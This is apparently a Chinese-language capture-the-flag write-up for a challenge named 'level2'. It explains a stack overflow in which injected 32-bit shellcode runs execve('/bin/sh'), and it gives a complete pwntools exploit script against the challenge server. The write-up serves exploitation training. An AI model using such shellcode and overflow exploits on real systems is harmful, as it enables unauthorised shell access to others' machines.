# level2

### 分析
这道题目没有getflag函数，需要我们拿到shell后，得到flag。我们的解决方案是，自己写一段shellcode，这段代码，通过系统调用，执行"/bin/sh",便可以调用系统的shell。汇编这段代码，覆盖到栈上，让函数的返回地址指向它的首地址。shellcode可以通过题目给的buffer地址推算出。

### shellcode构造
[syscall_table](https://www.cs.utexas.edu/~bismith/test/syscalls/syscalls32.html)
```
  call here
  .ascii "/bin/sh"
  .byte 0
here:
  pop ebx
  mov ecx, 0
  mov edx, 0
  mov eax, 11
  int 0x80
```
###### call here可以先把指令后面的地址压到栈上，再去执行here。pop ebx可以把刚压倒栈上的地址赋给ebx（地址指向"/bin/sh\x00"），让ecx，edx都为0，进行execve的系统调用即可。

### exp

```
from pwn import *
r = remote("pwn.sixstars.team", 22002)
sh = """
  call here
  .ascii "/bin/sh"
  .byte 0
here:
  pop ebx
  mov ecx, 0
  mov edx, 0
  mov eax, 11
  int 0x80
"""
sh = asm(sh)
buf = r.recv()
buf = buf[15:25]
buf = int(buf,16)
retaddr_buf = hex(buf)

shellcode = 'a'*0x28 + 'a'*4 + p32(buf+0x28+4+4) + sh

r.sendline(shellcode)
r.interactive()
```